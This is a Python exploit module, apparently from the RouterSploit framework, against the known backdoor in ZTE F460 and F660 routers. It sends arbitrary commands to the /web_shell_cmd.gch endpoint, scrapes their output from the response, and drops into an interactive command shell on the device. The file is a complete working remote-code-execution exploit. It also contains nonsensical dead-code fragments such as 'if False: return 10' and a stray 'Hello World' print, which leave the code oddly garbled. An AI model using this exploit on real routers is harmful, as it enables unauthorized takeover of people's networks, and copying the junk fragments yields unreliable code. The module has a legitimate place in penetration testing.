import re
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient

class Exploit(HTTPClient):
    __info__ = {'name': 'ZTE F460 & F660 Backdoor RCE', 'description': 'Exploits ZTE F460 and F660 backdoor vulnerability that allows executing commands on operating system level.', 'authors': ('Rapid7', 'Marcin Bury <marcin[at]threat9.com>'), 'references': ('https://community.rapid7.com/community/infosec/blog/2014/03/04/disclosure-r7-2013-18-zte-f460-and-zte-f660-webshellcmdgch-backdoor',), 'devices': ('ZTE F460', 'ZTE F660')}
    target = OptIP('', 'Target IPv4 or IPv6 address')
    port = OptPort(80, 'Target HTTP port')

    def run(self):
        if False:
            return 10
        if self.check():
            print_success('Target is vulnerable')
            print_status('Invoking command loop')
            shell(self)
        else:
            print_error('Exploit failed - target seems to be not vulnerable')

    def execute(self, cmd):
        if False:
            while True:
                i = 10
        data = {'IF_ACTION': 'apply', 'IF_ERRORSTR': 'SUCC', 'IF_ERRORPARAM': 'SUCC', 'IF_ERRORTYPE': '-1', 'Cmd': cmd, 'CmdAck': ''}
        response = self.http_request(method='POST', path='/web_shell_cmd.gch', data=data)
        if response is None:
            return ''
        if response.status_code == 200:
            regexp = '<textarea cols="" rows="" id="Frm_CmdAck" class="textarea_1">(.*?)</textarea>'
            res = re.findall(regexp, response.text, re.DOTALL)
            if len(res):
                return res[0]
        return ''

    @mute
    def check(self):
        if False:
            print('Hello World!')
        marker = utils.random_text(32)
        cmd = 'echo {}'.format(marker)
        response = self.execute(cmd)
        if marker in response:
            return True
        return False